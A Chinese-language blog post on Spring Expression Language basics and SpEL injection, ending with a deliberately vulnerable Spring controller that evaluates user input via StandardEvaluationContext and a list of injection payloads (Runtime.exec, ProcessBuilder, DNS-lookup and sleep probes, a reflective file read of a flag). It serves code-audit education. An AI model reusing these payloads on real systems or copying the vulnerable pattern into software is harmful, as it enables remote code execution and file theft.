---
title: SpEL表达式注入
date: 2025-10-02 13:53:40
updated: 2025-12-28 09:00:55
tags:
  - Web
  - java
  - 代码审计
---
> SpEL 支持在XML和注解配置中使用，它可以在Spring框架的各种组件中使用，如Spring MVC 控制器、Spring Security 安全框架、Spring Data 数据访问框架等。它可以方便地访问对象的属性、调用对象的方法、进行数学运算、逻辑运算、正则表达式匹配等操作。

# SpEL 基础

[8. Spring 表达式语言 (SpEL)](http://itmyhome.com/spring/expressions.html)

## 表达式符号

在 SpEL 中，使用`#{<表达式>}`界定符被认为是 SpEL 表达式，可以使用相关变量、属性和方法等操作。

## 类型表达式

T(type) 用于获取一个类型的 Class 对象。

语法格式为：T(package.ClassName)，例如，要获取java.lang.String 类的 Class 对象，可以使用表达式 T(java.lang.String)。

可以使用 T(type) 来调用静态方法和属性。例如：T(java.lang.Math).PI 表示获取 Math类中的 PI 静态属性，T(java.lang.Math).random() 表示调用 Math 类中的 random() 静态方法。

需要注意的是，在使用 T(type) 操作符时，要确保指定的类型已经被加载，否则会抛出ClassNotFoundException 异常。

## SpEL 用法

-   在注解中

-   使用 @Value 注解将 SpEL 表达式应用于 Bean 属性、构造函数参数和集合元素等场景

```java
//@Value 注解将 SpEL 表达式注入到 name 属性中：
@Component
public class ExampleBean {
    @Value("#{systemProperties['user.name']}")
    private String name;
    // Getter and setter methods
}
```

-   在 XML 配置中

-   SpEL 表达式可以在 XML 配置中用`#{expression}`的形式引用。

```xml
<bean id="exampleBean" class="com.example.ExampleBean">
  <property name="name" value="#{systemProperties['user.name']}"/>
</bean>
```

-   在代码块中使用 Expression

-   使用 Expression 接口可以在运行时编译和评估表达式，也可以设置变量和函数等。

```java
// SpEL表达式被用于计算两个数字的和：
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("2 + 3");
Integer sum = (Integer) exp.getValue();
System.out.println(sum); // Output: 5
```

## EvaluationContext 接口

在使用 SpEL 时，我们需要将表达式与 EvaluationContext 进行绑定，然后将表达式交给 SpEL 引擎执行。EvaluationContext 为 SpEL 引擎提供了上下文信息，使得 SpEL 引擎能够正确地解析表达式中的变量、函数等信息，从而求出表达式的结果。

SimpleEvaluationContext 和 StandardEvaluationContext 都是 SpEL 提供的 EvaluationContext 的实现类。

SimpleEvaluationContext 相对来说比较简单，它仅仅包含了变量解析器和类型转换器，不支持函数表达式。而 StandardEvaluationContext 提供了更丰富的上下文信息，包括变量解析器、类型转换器和函数表达式等。同时， StandardEvaluationContext 还支持自定义函数和类加载器等高级功能。

## 应用场景

### Spring 框架中的Bean定义

```xml
//使用SpEL表达式来定义Bean的属性和构造函数参数
<bean id="exampleBean" class="com.example.ExampleBean">
  <property name="message" value="#{'Hello ' + worldBean.name}" />
</bean>
```

### Spring Security 框架中的权限控制

```java
//使用SpEL表达式来定义用户角色和资源权限
@PreAuthorize("hasRole('ROLE_ADMIN') and #account.enabled")
public void deleteUser(Account account) {
// delete user
}
```

### Spring Data 框架中的查询条件

```java
//使用SpEL表达式来定义查询条件
@Query("select e from Employee e where e.salary > :#{#salary + 1000}")
List<Employee> findEmployeesWithSalaryGreaterThan(@Param("salary") int salary);
```

### Spring Batch框架中的任务配置

```xml
//使用SpEL表达式来定义任务的参数和条件
<batch:job id="exampleJob">
  <batch:step id="step1">
    <batch:tasklet>
      <batch:chunk reader="itemReader" writer="itemWriter" commit-
        interval="#{jobParameters['commit.interval'] ?: 100}" />
    </batch:tasklet>
  </batch:step>
</batch:job>
```

### Java 代码中的通用表达式计算

```java
//使用 SpEL 表达式来计算任意表达式
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("'Hello ' + 'World'");
String message = (String) exp.getValue(); // message = "Hello World"
```

# SpEL 注入漏洞

触发 SpEL 的漏洞的流程大致为：接收了用户的入且未过滤等操作，将接收的参数使用`StandardEvaluationContext`去处理，并对表达式调用了`getValue() 或 setValue()`方法。

[SimpleEvaluationContext 文档](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html)

[StandardEvaluationContext 文档](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/StandardEvaluationContext.html)

```java
package com.example.speldemo;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import java.util.Objects;

@RestController
public class SpELdemo {
    /**
* 127.0.0.1:8080/spel/vul/?
ex=T(java.lang.Runtime).getRuntime().exec("calc")
*/
    @GetMapping("/spel/vuln")
    public String vul1(String ex) {
        ExpressionParser parser = new SpelExpressionParser();
        //StandardEvaluationContext权限过大，可以执行任意代码，默认使用可以不指定
        EvaluationContext evaluationContext = new StandardEvaluationContext();
        Expression exp = parser.parseExpression(ex);
        return exp.getValue(evaluationContext).toString();
    }
}
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1759414987807-f3a40416-b673-4103-b1dc-985804a299c2.png)

```java
${12*12}
T(java.lang.Runtime).getRuntime().exec("nslookup a.com")
T(Thread).sleep(10000)
#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup a.com')
new java.lang.ProcessBuilder({'nslookup a.com'}).start()

${#strings.class.forName("org.springframework.util.StreamUtils").getMethod("copyToString", #strings.class.forName("java.io.InputStream"), #strings.class.forName("java.nio.charset.Charset")).invoke(null, #strings.class.forName("java.net.URI").getMethod("create", #strings.class.forName("java.lang.String")).invoke(null, #strings.concat("file:///","fl","ag_y0u_d0nt_kn0w")).toURL().openStream(), #strings.class.forName("java.nio.charset.StandardCharsets").getField("UTF_8").get(null))}

```

[SpELdemo.7z](https://www.yuque.com/attachments/yuque/0/2025/7z/39170111/1760862961098-3f353ae5-1a62-4f3a-b684-ae762a89c911.7z)